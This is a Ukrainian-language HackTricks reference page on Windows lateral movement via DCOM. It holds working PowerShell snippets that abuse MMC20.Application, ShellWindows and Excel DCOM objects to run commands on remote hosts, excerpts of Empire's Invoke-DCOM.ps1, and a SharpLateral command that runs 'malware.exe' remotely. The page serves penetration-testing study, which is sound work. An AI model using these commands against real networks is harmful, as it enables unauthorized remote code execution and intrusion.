# DCOM Exec

<details>

<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Працюєте в **кібербезпецівій компанії**? Хочете побачити **рекламу вашої компанії на HackTricks**? або хочете мати доступ до **останньої версії PEASS або завантажити HackTricks у PDF**? Перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
* Отримайте [**офіційний PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Приєднуйтесь до** [**💬**](https://emojipedia.org/speech-balloon/) [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за мною на **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**репозиторію hacktricks**](https://github.com/carlospolop/hacktricks) **та** [**репозиторію hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud)..

</details>

**Try Hard Security Group**

<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

***

## MMC20.Application

**Для отримання додаткової інформації про цю техніку перегляньте оригінальний пост за посиланням [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)**


Розподілений об'єктний модель компонентів (DCOM) надає цікаві можливості для мережевої взаємодії з об'єктами. Microsoft надає вичерпну документацію як для DCOM, так і для моделі об'єктів компонентів (COM), доступну [тут для DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) і [тут для COM](https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363\(v=vs.85\).aspx). Список додатків DCOM можна отримати за допомогою команди PowerShell:
```bash
Get-CimInstance Win32_DCOMApplication
```
COM-об'єкт, [Клас додатка MMC (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), дозволяє скриптування операцій MMC snap-in. Зокрема, цей об'єкт містить метод `ExecuteShellCommand` під `Document.ActiveView`. Додаткову інформацію про цей метод можна знайти [тут](https://msdn.microsoft.com/en-us/library/aa815396\(v=vs.85\).aspx). Перевірте його запускаючи:

Ця функція сприяє виконанню команд через мережу за допомогою додатка DCOM. Для взаємодії з DCOM віддалено як адміністратор, можна скористатися PowerShell наступним чином:
```powershell
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```
Ця команда підключається до додатку DCOM та повертає екземпляр об'єкта COM. Метод ExecuteShellCommand може бути викликаний для виконання процесу на віддаленому хості. Процес включає наступні кроки:

Перевірка методів:
```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```
Отримати віддалене виконання коду (RCE):
```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com | Get-Member

# Then just run something like:

ls \\10.10.10.10\c$\Users
```
## ShellWindows & ShellBrowserWindow

**Для отримання додаткової інформації про цю техніку перевірте оригінальний пост [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**

Було виявлено, що об'єкт **MMC20.Application** не має явних "LaunchPermissions" і має дозволи, що дозволяють адміністраторам доступ. Для отримання додаткових відомостей можна дослідити тему [тут](https://twitter.com/tiraniddo/status/817532039771525120), і рекомендується використання [@tiraniddo](https://twitter.com/tiraniddo) OleView .NET для фільтрації об'єктів без явних дозволів на запуск.

Два конкретних об'єкти, `ShellBrowserWindow` та `ShellWindows`, були виділені через відсутність явних дозволів на запуск. Відсутність запису реєстру `LaunchPermission` під `HKCR:\AppID\{guid}` свідчить про відсутність явних дозволів.

###  ShellWindows
Для `ShellWindows`, який не має ProgID, методи .NET `Type.GetTypeFromCLSID` та `Activator.CreateInstance` дозволяють створювати об'єкти за допомогою його AppID. Цей процес використовує OleView .NET для отримання CLSID для `ShellWindows`. Після створення можливе взаємодія через метод `WindowsShell.Item`, що призводить до виклику методу, наприклад, `Document.Application.ShellExecute`.

Наведено приклади команд PowerShell для створення об'єкта та віддаленого виконання команд:
```powershell
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
### Бічний рух з об'єктами Excel DCOM

Бічний рух можна досягти, використовуючи об'єкти DCOM Excel. Для докладної інформації рекомендується прочитати обговорення про використання Excel DDE для бічного руху через DCOM на [блозі Cybereason](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom).

Проект Empire надає сценарій PowerShell, який демонструє використання Excel для віддаленого виконання коду (RCE) шляхом маніпулювання об'єктами DCOM. Нижче наведені уривки зі сценарію, доступного на [сховищі GitHub Empire](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), де показані різні методи зловживання Excel для RCE:
```powershell
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
### Інструменти автоматизації для бічного руху

Для автоматизації цих технік виділено два інструменти:

- **Invoke-DCOM.ps1**: Скрипт PowerShell, наданий проектом Empire, який спрощує виклик різних методів для виконання коду на віддалених машинах. Цей скрипт доступний у сховищі GitHub Empire.

- **SharpLateral**: Інструмент, призначений для виконання коду віддалено, який можна використовувати за допомогою команди:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
## Автоматичні Інструменти

* Сценарій Powershell [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/lateral\_movement/Invoke-DCOM.ps1) дозволяє легко викликати всі закоментовані способи виконання коду на інших машинах.
* Ви також можете використовувати [**SharpLateral**](https://github.com/mertdas/SharpLateral):
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
## Посилання

* [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
* [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)

**Група Try Hard Security**

<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

<details>

<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Інші способи підтримки HackTricks:

* Якщо ви хочете побачити вашу **компанію рекламовану в HackTricks** або **завантажити HackTricks у форматі PDF**, перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) **і** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **репозиторіїв на GitHub**.

</details>
